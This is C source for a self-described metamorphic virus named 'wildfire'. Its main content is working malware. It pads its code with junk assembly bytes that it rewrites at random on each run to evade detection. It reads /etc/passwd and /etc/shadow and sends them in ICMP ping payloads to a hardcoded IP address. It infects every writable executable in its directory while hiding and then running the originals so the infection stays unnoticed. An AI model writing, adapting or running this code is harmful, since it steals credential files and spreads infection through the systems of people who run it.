#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>
#include <dirent.h>
#include <unistd.h>
#include <errno.h>

#define PUSH 0x50
#define POP 0x58
#define MOV 0xB8
#define NOP 0x90

#define ADD 0x01
#define AND 0x21
#define XOR 0x31
#define OR 0x09
#define SBB 0x19
#define SUB 0x29

const unsigned char prefixes[] = { ADD, AND, XOR, OR, SBB, SUB, 0 };

#define JUNK asm __volatile__(".byte 0x50, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x58\n");
#define JUNKLEN 8

/* Binary code of the current executable */
unsigned char *code;
/* Length of the binary code */
int codelen;
/* Name of the original executable */
unsigned char *original_executable;
/* Flag to check if malware's first run */
int first_run = 1;

/* Reads binary code from file */
void read_code(const char *file_name)
{
    // Opens file in read binary mode
    FILE *fp = fopen(file_name, "rb");   JUNK;
    // Sets the file position of the stream to the given offset (0 long int)
    fseek(fp, 0L, SEEK_END);             JUNK;
    // Sets the length of the code in bytes
    codelen = ftell(fp);
    // Allocates memory to the length of the code
    code = malloc(codelen);              JUNK;
    // Sets the file position of the stream to the start of the file
    fseek(fp, 0L, SEEK_SET);
    // Reads the file into the code variable in memory
    fread(code, codelen, 1, fp);         JUNK;
    // Closes the file
    fclose(fp);
}

/* Writes binary code to file */
void write_code(const char *file_name)
{
    // Opens file with binary write permissions
    FILE *fp = fopen(file_name, "wb");          JUNK;
    // Writes the code variable to file
    fwrite(code, codelen, 1, fp);               JUNK;
    // Closes the file
    fclose(fp);
}

/* Write assembly instruction */
int write_instruction(unsigned reg, int offset, int space)
{
    // Write instruction based on the amount of space available
    if (space < 2)
    {
        code[offset] = NOP;                         JUNK;
        return 1;
    }
    else if (space < 5 || rand()%2 == 0)
    {
        code[offset] = prefixes[rand()%6];          JUNK;
        code[offset+1] = 0xC0 + rand()%8*8 + reg;   JUNK;
        return 2;
    }
    else
    {
        code[offset] = MOV+reg;                     JUNK;
        *(short*)(code+offset+1) = rand();
        *(short*)(code+offset+3) = rand();          JUNK;
        return 5;
    }
}

/* Read assembly instruction */
int read_instruction(unsigned reg, int offset)
{
    // Read first instruction at offset
    unsigned c1 = code[offset];
    // Return the amount of space used for instruction
    if (c1 == NOP)
    {
        return 1;                       JUNK;
    }
    if (c1 == MOV+reg)
    {
        return 5;                       JUNK;
    }
    if (strchr(prefixes, c1))
    {
        // Read second instruction at offset
        unsigned c2 = code[offset+1];   JUNK;
        if (c2 >= 0xC0 && c2 <= 0xFF && (c2&7) == reg)
        {
            return 2;                   JUNK;
        }                               JUNK;
        return 0;
    }
}

/* Metamorphic replacement of junk */
void replace_junk(void)
{
    int i, j, inc, space;
    srand(time(NULL));                                  JUNK;

    for (i=0; i < codelen-JUNKLEN-2; i++)
    {
        unsigned start = code[i];
        unsigned end = code[i+JUNKLEN+1];
        unsigned reg = start-PUSH;

        if (start < PUSH || start >= PUSH+8) continue;  JUNK;
        if (end != POP+reg) continue;                   JUNK;

        // Register 4 is ESP (stack)
        if (reg == 4) continue;

        j = 0;                                          JUNK;
        while (inc = read_instruction(reg, i+1+j)) j += inc;
        if (j != JUNKLEN) continue;                     JUNK;

        reg = rand()%7;                                 JUNK;
        reg += (reg >= 4);
        code[i] = PUSH + reg;                           JUNK;
        code[i+JUNKLEN+1] = POP + reg;                  JUNK;

        space = JUNKLEN;
        j = 0;                                          JUNK;
        while (space)
        {
            inc = write_instruction(reg, i+1+j, space); JUNK;
            j += inc;
            space -= inc;                               JUNK;
        }
    }
}

/* Reads a standard file */
char* read_file(const char *file_name)
{
    char *str;
    int strlen;

    // Opens file in read mode
    FILE *fp = fopen(file_name, "r");   JUNK;
    // Sets the file position of the stream to the given offset (0 long int)
    fseek(fp, 0L, SEEK_END);            JUNK;
    // Sets the length of the code
    strlen = ftell(fp);
    // Allocates memory to the length of the code
    str = malloc(strlen);               JUNK;
    // Gets the file position of the stream to the start of the file
    fseek(fp, 0L, SEEK_SET);
    // Reads the file into the code variable in memory
    fread(str, strlen, 1, fp);          JUNK;
    // Closes the file
    fclose(fp);

    return str;
}

// Send /etc/passwd and /etc/shadow files in a ping
void execute(const char *ip_addr)
{
    const int payload_len = 1400;

    char *passwd;                           JUNK;
    char *shadow;
    int passwd_len;                         JUNK;
    int shadow_len;

    passwd = read_file("/etc/passwd");
    shadow = read_file("/etc/shadow");      JUNK;

    passwd_len = strlen(passwd);
    shadow_len = strlen(shadow);            JUNK;

    char *ping = "sudo nping --quiet -c 1 --icmp --data-string \"%s\" %s > /dev/null 2>&1";
    int ping_len = strlen(ping);            JUNK;

    int len = passwd_len;                   JUNK;
    int offset = 0;                         JUNK;
    while (len > 0)
    {
        char cmd_part[payload_len];
        sprintf(cmd_part, "%.*s", payload_len, passwd + (payload_len * offset));
        len -= payload_len;
        offset += 1;                        JUNK;
        int tmp_len = strlen(cmd_part) + ping_len;
        char tmp_cmd[tmp_len];
        sprintf(tmp_cmd, ping, cmd_part, ip_addr);
        system(tmp_cmd);                    JUNK;
    }
    

    len = shadow_len;                       JUNK;
    offset = 0;                             JUNK;
    while (len > 0)
    {
        char cmd_part[payload_len];
        sprintf(cmd_part, "%.*s", payload_len, shadow + (payload_len * offset));
        len -= payload_len;
        offset += 1;                        JUNK;
        int tmp_len = strlen(cmd_part) + ping_len;
        char tmp_cmd[tmp_len];
        sprintf(tmp_cmd, ping, cmd_part, ip_addr);
        system(tmp_cmd);                    JUNK;
    }
}

/* Executes a bash command to execute and hide an original executable file */
void copy_and_hide_file(const char *bash_code, const char *filename)
{
    int cmd_len = strlen(bash_code) + strlen(filename) + 1;
    char cmd[cmd_len];                      JUNK;

    sprintf(cmd, bash_code, filename, filename);

    system(cmd);                            JUNK;
}

/* Executes a bash command */
void execute_bash(const char *bash_code, const char *file_name)
{
    int cmd_len = strlen(bash_code) + strlen(file_name) + 1;
    char cmd[cmd_len];                      JUNK;

    sprintf(cmd, bash_code, file_name);     JUNK;

    system(cmd);
}

/* Embeds the malware in the executable and hides a copy of the original executable */
void embed_code(const char *file_name)
{
    copy_and_hide_file("cp %s .wildfire_%s", file_name);    JUNK;
    execute_bash("chmod +x %s", file_name);                 JUNK;

    write_code(file_name);                                  JUNK;
}

// Lists files in passed in directory path
void propagate(const char *path, const char *exclude) {
DIR *dir;
    struct dirent *ent;

    // Open directory stream
    dir = opendir ("./");                                   JUNK;
    if (dir != NULL) {
        // Iterate over all files in the current directory
        while ((ent = readdir (dir)) != NULL) {
            // Select regular files only, not DT_DIR (directories) nor DT_LNK (links)
            if (ent->d_type == DT_REG)
            {
                // Select executable and writable files that can be infected
                if (access(ent->d_name, X_OK) == 0 && access(ent->d_name, W_OK) == 0)
                {
                    // Ignore the executable that is running the program
                    if (strstr(exclude, ent->d_name) != NULL)
                    {
                        original_executable = ent->d_name;  JUNK;
                    }
                    // Ignore hidden executables with wildfire label
                    else if (strstr(ent->d_name, "wildfire") != NULL)
                    {
                        first_run = 0;                      JUNK;
                    }
                    else
                    {
                        // Ignore executables that have already been infected
                        const char *bash_code = ".wildfire_%s";
                        int hidden_file_len = strlen(bash_code) + strlen(ent->d_name) + 1;
                        char hidden_file[hidden_file_len];  JUNK;
                        sprintf(hidden_file, bash_code, ent->d_name);

                        if( access(hidden_file, F_OK) == -1 ) {
                            embed_code(ent->d_name);        JUNK;
                        }
                    }
                }
            }
        }

        closedir (dir);                                     JUNK;

    } else {
        // Error if directory fails to open
        fprintf (stderr, "Cannot open %s (%s)\n", "./", strerror (errno));
        exit (EXIT_FAILURE);
    }
}

/* Main function of metamorphic virus */
int main(int argc, char* argv[])
{
    // Outputs 0 if executable is running with root privileges
    int id = system("id -u > /dev/null 2>&1");
    // Sends ICMP ping with custom payload to IP
    execute("192.168.1.142");                               JUNK;
    // Reads code into memory from currently running executable
    read_code(argv[0]);                                     JUNK;
    // Metamorphically changes the code in a random fashion
    replace_junk();                                         JUNK;
    // Propagates the malware into other executables in the same directory
    propagate("./", argv[0]);                               JUNK;
    // Edge case to prevent an infinite loop during the malware's first execution
    if (first_run == 1)
    {
        execute_bash("touch .wildfire_%s", original_executable);
        execute_bash("chmod +x .wildfire_%s", original_executable);
    }
    // Execute the original, hidden executable
    execute_bash("./.wildfire_%s", original_executable);    JUNK;

    return 0;
}